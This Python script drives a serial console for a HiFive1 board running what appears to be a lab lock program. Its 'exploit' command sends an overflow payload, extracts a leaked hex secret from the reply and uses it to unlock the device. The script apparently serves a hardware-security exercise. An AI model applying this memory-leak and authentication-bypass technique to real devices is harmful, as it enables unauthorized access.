#!/usr/bin/python3
import serial
import sys
import re
from time import sleep
from string import printable

#this function is the main body of the code and runs in a loop, allowing you to re-lock the arduino without ever leaving the program
def loop(): 

	def print_returned_message(received_bytes):
		for byte in received_bytes:
			if chr(byte) in printable:
				print(chr(byte), end="")
			else:
				print(" {} ".format(hex(byte)), end="")

	def format_message(message):
		return bytes(message + "\n", "ascii")
	
	print("waiting until locked")
	
	while (hifive1.in_waiting < 12):
		sleep(0.1)

	print(hifive1.read(13).decode(), end="")

	while True:
		user_in = input()
		if user_in == "exit":
			sys.exit(0)
		elif user_in == "re-lock":
			return
		
		elif user_in == "exploit":
			secret_regex = re.compile("[0-9A-F]{6,8}")
			hifive1.write(format_message("\x13\x37"*6 + "+")) # 3 words + 1 byte
			returned_bytes = hifive1.read(500)
			success = False
			if len(returned_bytes) > 13:
				secret = secret_regex.findall("".join(chr(i) for i in returned_bytes if chr(i) in printable))[0].zfill(8)
				# join all the printable characters from the bytes after position 13 in the byte array 
				# returned by hifive1.read(500) and pass that into a regex for a 6 to 8 digit hex number 
				if secret != "0"*8:
					print("Exploit found this secret: " + secret)
					print("Unlocking device.")
					hifive1.write(format_message(secret))
					print("Vulnerability successfully exploited.")
					success = True
			hifive1.flush()
			if not success:	
				print("Exploit failed, secret not found.")
			sleep(0.1)
										
		else:
			hifive1.write(format_message(user_in))
			print_returned_message(hifive1.read(500))
		

READTIMEOUT = 0.1
# check that ttyUSBx is correct
try:
	hifive1 = serial.Serial("/dev/ttyUSB1", 9600, timeout=READTIMEOUT)
except IOError as e:
	print("Please plug hifive1 in.")
	print("When the hifive1 is plugged in, please enter: \"in\"")
	
	while input() != "in":
		pass
	
	try:
		hifive1 = serial.Serial("/dev/ttyUSB1", 9600, timeout=READTIMEOUT)
	except IOError as e:
		print("Still can't find the hifive1.")
		print("\nIf already plugged in: use the arduino IDE to find the correct ttyUSBx.\n")
		print("Enter which ttyUSBx to use(default=1):")
		tty_number = input()

		try:
			hifive1 = serial.Serial("/dev/ttyUSB" + tty_number, 9600, timeout=READTIMEOUT)
		except IOError as e:
			print("that failed, enter: \"exit\" to quit program")
			while True:
				print("Enter which ttyUSBx to use:")
				tty_number = input()
				try:
					hifive1 = serial.Serial("/dev/ttyUSB" + tty_number, 9600, timeout=READTIMEOUT)
					break
				except IOError as e:
					print("that failed, enter: \"exit\" to quit program")
	
# run the loop function forever
while True: 
	loop()

